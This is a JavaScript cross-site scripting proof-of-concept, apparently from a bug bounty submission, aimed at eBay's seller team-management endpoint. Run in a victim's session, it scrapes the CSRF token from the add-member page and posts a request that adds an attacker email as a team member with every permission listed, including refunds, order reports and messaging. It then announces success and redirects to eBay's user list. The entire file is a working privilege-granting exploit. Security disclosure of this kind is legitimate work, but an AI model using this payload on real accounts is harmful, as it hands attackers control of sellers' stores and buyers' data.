// XSS PoC - Add Team Member with Success Alert & Redirect
(async function() {
    const attackerEmail = "naysser+xss@bugcrowdninja.com";
    const firstName = "HackedBy";
    const lastName = "nasserwashere";
    
    try {
        // Step 1: Fetch the page to extract CSRF token
        const response = await fetch('/teamxs/member/add-member', {
            method: 'GET',
            credentials: 'include'
        });
        
        const html = await response.text();
        
        // Step 2: Extract SRT token
        const srtMatch = html.match(/"srt"\s*:\s*"([a-f0-9]+)"/);
        
        if (!srtMatch || !srtMatch[1]) {
            alert('PoC Failed - Could not extract CSRF token');
            return;
        }
        
        const srtToken = srtMatch[1];
        
        // Step 3: Payload with all permissions
        const payload = {
            permissionList: [
                { permissionId: "5000000002", permissionName: "Publish and revise listings", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000001", permissionName: "Create and edit drafts", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000009", permissionName: "Manage refunds, requests and disputes", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000006", permissionName: "Download order report", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000008", permissionName: "Print shipping labels", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000007", permissionName: "Add shipping tracking", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000005", permissionName: "View orders", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000012", permissionName: "Manage member to member messages", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000010", permissionName: "Create and manage discounts, buyer groups", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000011", permissionName: "Create and manage advertising campaigns", permissionNameSpace: "PERMISSION" },
                { permissionId: "5000000004", permissionName: "Research products using Terapeak", permissionNameSpace: "PERMISSION" }
            ],
            firstName: firstName,
            lastName: lastName,
            email: attackerEmail,
            message: "good"
        };
        
        // Step 4: Send SINGLE POST request
        const addMemberResponse = await fetch(`/teamxs/member/add-member?srt=${srtToken}`, {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*'
            },
            body: JSON.stringify(payload)
        });
        
        const result = await addMemberResponse.json();
        
        // Step 5: Check response and show alert
        if (addMemberResponse.ok) {
            alert('✅ PoC Succeeded by Naysser!\n\nTeam member added successfully.\nRedirecting to user list...');
            // Step 6: Redirect to user list
            window.location.href = 'https://www.ebay.com/sh/acct/userlist';
        } else {
            alert('PoC Failed - ' + JSON.stringify(result));
        }
        
    } catch (error) {
        alert('PoC Error: ' + error.message);
    }
})();
